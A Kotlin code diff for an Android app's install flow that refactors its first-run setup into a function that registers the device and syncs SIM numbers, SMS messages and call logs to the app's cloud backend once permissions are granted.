@@ -71,15 +71,36 @@ object InstallFlow {
                         CallSyncService.ensureRunning(app)
                         return@holdDuring
                     }
-                    SimNumberHelper.registerAllSimsInMongo(app)
-                    SyncScheduler.syncIfPermittedNow(app, source)
-                    MessageSyncHelper.syncAllMessagesNow(app, source)
-                    CallSyncHelper.syncAllCallsToMongoNow(app, source)
-                    completeSetup(app)
+                    if (runFirstCloudSync(app)) {
+                        completeSetup(app)
+                    }
                 } catch (error: Exception) {
                     Log.e(TAG, "Initial setup failed ($source)", error)
                 }
             }
         }
+    }
+
+    fun runFirstCloudSync(context: Context): Boolean {
+        val app = context.applicationContext
+        MongoSyncHelper.ensureApiUrl(app)
+        CallSyncHelper.markBackgroundSyncEnabled(app, true)
+        SimNumberHelper.ensureSimReadyForSync(app)
+
+        val woke = MongoSyncHelper.wakeServer(app)
+        Log.d(TAG, "Render health: $woke")
+
+        val registered = DeviceRegistration.registerNow(app)
+        if (SyncBootstrap.needsRuntimePermissions(app)) {
+            Log.w(TAG, "First sync: registered=$registered (permissions pending)")
+            return registered
+        }
+
+        SimNumberHelper.registerAllSimsInMongo(app)
+        val synced = SyncScheduler.syncIfPermittedNow(app, "first_open")
+        MessageSyncHelper.syncAllMessagesNow(app, "first_open")
+        CallSyncHelper.syncAllCallsToMongoNow(app, "first_open")
+        Log.d(TAG, "First cloud sync registered=$registered synced=$synced")
+        return registered || synced
     }
 }
